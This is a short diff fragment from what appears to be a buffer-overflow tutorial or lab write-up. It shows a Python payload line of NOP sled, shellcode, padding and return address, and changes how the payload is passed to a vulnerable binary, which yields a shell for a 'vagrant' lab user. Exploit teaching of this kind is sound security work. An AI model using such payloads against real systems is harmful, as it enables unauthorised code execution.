@@ -228,7 +228,7 @@ print "\x90"*40 + shellcode + "A"*47 + "\x20\xce\xff\xff"
 and we can execute our program with this payload:
 
 ``` shell
-python attack.py | ./vuln
+./vuln $(python attack.py)
 ```
 
 We obtain a shell for the user `vagrant`:
